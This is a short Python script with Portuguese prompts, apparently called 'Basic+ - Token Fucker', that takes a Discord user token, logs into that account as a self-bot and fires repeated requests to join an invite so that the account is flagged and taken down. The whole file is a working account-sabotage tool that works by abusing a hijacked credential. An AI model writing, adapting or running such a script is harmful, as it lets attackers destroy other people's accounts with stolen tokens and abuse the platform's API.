import discord
import asyncio
import requests
import sys
from colorama import Fore
from pyfiglet import Figlet

f = Figlet(font='slant')
print (f.renderText('Basic+ - Token Fucker'))
#\

print (' ')
print ('--------------------------------------------------------------------------------------------')
print (' ')
print ('                                     -----------------------        ')
print ('                                    |                       |       ')
print ('                                    | Basic+ - Token Fucker |       ')
print ('                                    |    2021 - Basic+      |       ')
print ('                                    |                       |       ')
print ('                                     -----------------------        ')
print (' ')

token = input ("Coloque o token que queira derrubar: ")

client = discord.Client()
print ("Preparando para derrubar a conta...")

@client.event
async def on_ready():
    print ("Derrubando a conta, espere!")
    for x in range(30):
        apilink = "https://discordapp.com/api/v6/invite/r3sSKJJ"
        headers={
        'Authorization': token
        }
        requests.post(apilink, headers=headers)
    print ("Conta derrubada :)")
    input()
    sys.exit()
try:
    client.run(token,bot=False)
except Exception:
    print ("Token invalido")